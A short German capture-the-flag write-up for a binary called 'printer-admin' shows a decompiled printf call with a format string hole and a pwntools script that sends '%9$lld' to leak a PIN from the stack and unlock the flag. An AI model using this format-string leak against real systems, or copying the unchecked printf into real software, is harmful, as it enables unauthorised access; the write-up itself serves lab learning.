In Ghidra sieht man eine Format String vulnerablity:
```c
fgets(local_18,8,stdin);
puts(&DAT_0040210e);
puts("-----------");
printf(local_18); //<-- format string vuln
```

Durch eine Schleife ermitteln wir, dass an Position 9 im Speicher der PIN liegt. Daher können wir mit folgendem Code, welcher den PIN aus dem Speicher ausließt, die ausgelesene PIN zurück an das Binary schicken.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./printer-admin")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBU:
            gdb.attach(r)
    else:
        r = remote("10.65.3.53", 1024)
    return r


def main():
   r = conn()
   r.recvuntil(b"Name: ")
   r.sendline(b"%9$lld") #<-- Format String Attacke
   r.recvuntil(b"--\n")
   pin = r.recvline()
   r.recvuntil(b"PIN: ")
   r.send(pin)
   r.interactive()
   r.close()

if __name__ == "__main__":
    main()

```

Danach kann man im Menü die Past Printjobs auswählen und die flag wird angezeigt.